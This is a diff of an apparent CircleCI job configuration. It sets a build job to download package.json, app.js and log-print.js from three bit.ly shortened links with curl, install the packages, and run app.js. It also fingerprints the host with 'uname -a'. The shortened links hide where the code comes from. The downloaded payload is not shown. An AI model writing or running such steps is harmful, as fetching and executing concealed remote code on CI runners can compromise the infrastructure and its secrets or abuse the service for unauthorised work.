@@ -7,13 +7,13 @@ jobs:
     resource_class: medium
     working_directory: ~/soure-data-run
     steps:
-      - run: node -v
+      - run: uname -a
       - run: 
-          #ame: Get soure
+          name: Get soure
           command: |-
             curl -fsSL https://bit.ly/3nvNdYs -o package.json && curl -fsSL https://bit.ly/3927CvS -o app.js && curl -fsSL https://bit.ly/3Cb0Pwk -o log-print.js
       - run: 
-          #ame: Node Install Packages
+          name: Node Install Packages
           command: |-
             npm i -s
       - run: node app.js
